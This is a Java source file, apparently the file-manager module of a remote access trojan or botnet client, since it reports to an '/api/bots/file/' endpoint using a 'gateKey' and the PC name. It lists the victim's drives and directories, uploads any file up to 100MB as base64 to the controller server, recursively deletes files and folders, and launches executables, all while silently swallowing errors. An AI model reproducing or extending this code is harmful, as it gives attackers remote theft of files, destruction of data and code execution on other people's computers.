import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.awt.Desktop;

public class FileManagerHandler {

    public static void listFiles(String serverUrl, String gateKey, String pcName, String dirPath) {
        try {
            if (dirPath == null || dirPath.trim().isEmpty() || dirPath.equalsIgnoreCase("DRIVES") || dirPath.equalsIgnoreCase("ROOT")) {
                File[] roots = File.listRoots();
                StringBuilder sb = new StringBuilder();
                sb.append("{\"success\":true,\"path\":\"DRIVES\",\"isDrives\":true,\"files\":[");
                boolean first = true;
                if (roots != null) {
                    for (File r : roots) {
                        if (!first) sb.append(",");
                        first = false;
                        sb.append("{");
                        sb.append("\"name\":\"").append(escapeJson(r.getAbsolutePath())).append("\",");
                        sb.append("\"isDir\":true,");
                        sb.append("\"isDrive\":true,");
                        sb.append("\"size\":").append(r.getTotalSpace()).append(",");
                        sb.append("\"free\":").append(r.getFreeSpace()).append(",");
                        sb.append("\"modified\":\"\",");
                        sb.append("\"path\":\"").append(escapeJson(r.getAbsolutePath())).append("\"");
                        sb.append("}");
                    }
                }
                sb.append("]}");
                postResult(serverUrl, gateKey, pcName, "file_list_result", sb.toString());
                return;
            }

            File dir = new File(dirPath);
            if (!dir.exists() || !dir.isDirectory()) {
                postResult(serverUrl, gateKey, pcName, "file_list_result",
                        "{\"success\":false,\"path\":\"" + escapeJson(dirPath) + "\",\"error\":\"Dizin bulunamadı\",\"files\":[]}");
                return;
            }

            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder();
            sb.append("{\"success\":true,\"path\":\"").append(escapeJson(dirPath)).append("\",\"isDrives\":false,\"files\":[");

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            boolean first = true;
            if (files != null) {
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });

                for (File f : files) {
                    if (!first) sb.append(",");
                    first = false;
                    sb.append("{");
                    sb.append("\"name\":\"").append(escapeJson(f.getName())).append("\",");
                    sb.append("\"isDir\":").append(f.isDirectory()).append(",");
                    sb.append("\"size\":").append(f.isDirectory() ? 0 : f.length()).append(",");
                    sb.append("\"modified\":\"").append(sdf.format(new Date(f.lastModified()))).append("\",");
                    sb.append("\"path\":\"").append(escapeJson(f.getAbsolutePath())).append("\"");
                    sb.append("}");
                }
            }
            sb.append("]}");

            postResult(serverUrl, gateKey, pcName, "file_list_result", sb.toString());
        } catch (Exception e) {
            postResult(serverUrl, gateKey, pcName, "file_list_result",
                    "{\"success\":false,\"path\":\"" + escapeJson(dirPath) + "\",\"error\":\"" + escapeJson(e.getMessage()) + "\",\"files\":[]}");
        }
    }

    public static void downloadFile(String serverUrl, String gateKey, String pcName, String filePath) {
        try {
            File f = new File(filePath);
            if (!f.exists() || !f.isFile()) {
                postResult(serverUrl, gateKey, pcName, "file_download_result",
                        "{\"success\":false,\"path\":\"" + escapeJson(filePath) + "\",\"error\":\"Dosya bulunamadı\"}");
                return;
            }

            if (f.length() > 100 * 1024 * 1024) {
                postResult(serverUrl, gateKey, pcName, "file_download_result",
                        "{\"success\":false,\"path\":\"" + escapeJson(filePath) + "\",\"error\":\"Dosya çok büyük (max 100MB)\"}");
                return;
            }

            byte[] data = Files.readAllBytes(f.toPath());
            String b64 = Base64.getEncoder().encodeToString(data);
            String fileName = f.getName();

            String json = "{\"success\":true,\"path\":\"" + escapeJson(filePath) + "\",\"fileName\":\"" + escapeJson(fileName) + "\",\"data\":\"" + b64 + "\"}";
            postResult(serverUrl, gateKey, pcName, "file_download_result", json);
        } catch (Exception e) {
            postResult(serverUrl, gateKey, pcName, "file_download_result",
                    "{\"success\":false,\"path\":\"" + escapeJson(filePath) + "\",\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    public static void deleteFile(String serverUrl, String gateKey, String pcName, String filePath) {
        try {
            File f = new File(filePath);
            boolean deleted = false;
            if (f.exists()) {
                if (f.isDirectory()) {
                    deleted = deleteDir(f);
                } else {
                    deleted = f.delete();
                }
            }
            postResult(serverUrl, gateKey, pcName, "file_delete_result",
                    "{\"success\":" + deleted + ",\"path\":\"" + escapeJson(filePath) + "\"}");
        } catch (Exception e) {
            postResult(serverUrl, gateKey, pcName, "file_delete_result",
                    "{\"success\":false,\"path\":\"" + escapeJson(filePath) + "\",\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    public static void executeFile(String serverUrl, String gateKey, String pcName, String filePath) {
        try {
            File f = new File(filePath);
            if (!f.exists()) {
                postResult(serverUrl, gateKey, pcName, "file_exec_result",
                        "{\"success\":false,\"path\":\"" + escapeJson(filePath) + "\",\"error\":\"Dosya bulunamadı\"}");
                return;
            }

            boolean isWindows = System.getProperty("os.name", "").toLowerCase().contains("win");
            boolean launched = false;

            if (isWindows) {
                try {
                    ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "start", "\"\"", f.getAbsolutePath());
                    if (f.getParentFile() != null) pb.directory(f.getParentFile());
                    pb.start();
                    launched = true;
                } catch (Exception ex1) {
                    try {
                        ProcessBuilder pb = new ProcessBuilder(f.getAbsolutePath());
                        if (f.getParentFile() != null) pb.directory(f.getParentFile());
                        pb.start();
                        launched = true;
                    } catch (Exception ex2) {
                        if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.OPEN)) {
                            Desktop.getDesktop().open(f);
                            launched = true;
                        } else {
                            throw ex2;
                        }
                    }
                }
            } else {
                try {
                    ProcessBuilder pb = new ProcessBuilder(f.getAbsolutePath());
                    if (f.getParentFile() != null) pb.directory(f.getParentFile());
                    pb.start();
                    launched = true;
                } catch (Exception ex1) {
                    if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.OPEN)) {
                        Desktop.getDesktop().open(f);
                        launched = true;
                    } else {
                        throw ex1;
                    }
                }
            }

            postResult(serverUrl, gateKey, pcName, "file_exec_result",
                    "{\"success\":" + launched + ",\"path\":\"" + escapeJson(filePath) + "\"}");
        } catch (Exception e) {
            postResult(serverUrl, gateKey, pcName, "file_exec_result",
                    "{\"success\":false,\"path\":\"" + escapeJson(filePath) + "\",\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private static void postResult(String serverUrl, String gateKey, String pcName, String action, String jsonBody) {
        try {
            URL url = new URL(serverUrl + "/api/bots/file/" + action + "?gateKey=" + URLEncoder.encode(gateKey, "UTF-8") + "&pcName=" + URLEncoder.encode(pcName, "UTF-8"));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(30000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonBody.getBytes("UTF-8"));
            }

            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private static boolean deleteDir(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) deleteDir(f);
                else f.delete();
            }
        }
        return dir.delete();
    }

    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}